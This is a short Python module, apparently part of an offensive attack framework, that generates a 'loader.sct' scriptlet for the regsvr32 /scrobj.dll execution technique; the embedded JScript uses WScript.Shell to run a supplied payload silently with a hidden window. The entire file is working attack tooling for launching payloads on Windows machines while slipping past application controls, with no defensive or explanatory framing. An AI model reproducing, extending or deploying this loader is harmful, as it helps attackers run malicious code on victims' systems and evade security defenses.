# modules/loaders/regsvr32_loader.py
import os

class Regsvr32Loader:
    def __init__(self):
        pass

    def generate_loader(self, payload_url, output_dir):
        """Génère un fichier .sct compatible regsvr32 /scrobj.dll"""
        sct_template = f'''
<script language="JScript">
    var r = new ActiveXObject("WScript.Shell");
    r.Run("{payload_url}", 0, false);
</script>
        '''.strip()

        output_path = os.path.join(output_dir, "loader.sct")
        with open(output_path, "w") as f:
            f.write(sct_template)

        return output_path
